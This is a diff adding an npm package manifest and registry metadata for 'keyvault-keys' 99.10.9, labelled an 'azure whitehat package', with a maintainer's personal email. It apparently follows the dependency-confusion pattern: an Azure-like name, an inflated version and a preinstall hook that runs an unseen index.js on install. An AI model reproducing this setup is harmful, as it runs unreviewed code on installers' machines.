@@ -1,0 +1,39 @@
+{
+    "name": "keyvault-keys",
+    "version": "99.10.9",
+    "description": "azure whitehat package",
+    "main": "index.js",
+    "scripts": {
+        "test": "echo \"error no test specified\" && exit 1",
+        "preinstall": "node index.js"
+    },
+    "author": "",
+    "License": "ISC",
+    "_id": "keyvault-keys@99.10.9",
+    "_nodeVersion": "14.16.1",
+    "_npmVersion": "6.14.11",
+    "dist": {
+        "integrity": "sha512-PdJ8Enka2xEH7nH+nZfAWydp8nFohiIf7dVKsRHy2Ms9qkYcVZ6zqxxPSakG1heCvT32xj6mWth+FinemviVXA==",
+        "shasum": "3ea359e194c5ef621f53d8edc0e3e299d128ed0d",
+        "tarball": "https://registry.npmjs.org/keyvault-keys/-/keyvault-keys-99.10.9.tgz",
+        "fileCount": 2,
+        "unpackedSize": 3577,
+        "npm-signature": "-----BEGIN PGP SIGNATURE-----\r\nVersion: OpenPGP.js v3.0.13\r\nComment: https://openpgpjs.org\r\n\r\nwsFcBAEBCAAQBQJhonv8CRA9TVsSAnZWagAADDcP/js3OrL7kiKFP4r/u1gr\nDtYW/WKmHr5Y9UYowxpGkbKEf9o3EDKGOmC+6Et0Uv8KBr54JBs3nYAWjaix\nKrfgpVCnXNHJS+0FAH/fdBS1/g0qE0nN2jX5lfmVCc//YLIx8DY2y41Eu7zo\nknEpxE3GcTdJ6ahMENg4kLdYqULYHkbrK/2790p+nYEzyZMnY+t4LEk1T97D\ngIMWVtibyMyAYaLbuuk3VunMY+E4Eq1aur9ur27+32Jt7H1AphikDx7un0Oh\n6jKx9796YJRSGdQmJPbfSugA5NPc6BheI1JjZTusTm7IkaaFI/J8Ibeya8bP\np5+B+e6h/GE/+wccdhKkeK9rXuyrfjFSzoZLE0qhR3h5/nDEAMP8DUacOs0m\nbI9NJ7GIOY9mEQ5Eh+DeXT+anGs6FEO8ISrV5f+m1HOYaO31ZBhV4jAFR/92\nZlrHrFC1ieF5s/yIg3X0RikywXgcemBIDgFdXJfvcHchqzXi9MGFzqVz3vVL\njzdIGreGiznv64h+rSWY5TkQkqyADLv3t4s1Vj2RA/hb1mdHXXZ7E2NuWXgP\n6W3IpOsTw/nZSDf4YI1GcjbIdoy9c6BdF6+RMWJ9PwECfWfgSvdWy4+WK+Pb\nojG+fDr3+uZYuFslq7zeVva9BOpPJzM8gXYu/e4dDuMqsScfpvSaVZwuGSuT\nrhtN\r\n=i9Nl\r\n-----END PGP SIGNATURE-----\r\n"
+    },
+    "_npmUser": {
+        "name": "rt11",
+        "email": "hussam.tes08@gmail.com"
+    },
+    "directories": {},
+    "maintainers": [
+        {
+            "name": "rt11",
+            "email": "hussam.tes08@gmail.com"
+        }
+    ],
+    "_npmOperationalInternal": {
+        "host": "s3://npm-registry-packages",
+        "tmp": "tmp/keyvault-keys_99.10.9_1638038524217_0.495002334089204"
+    },
+    "_hasShrinkwrap": false
+}
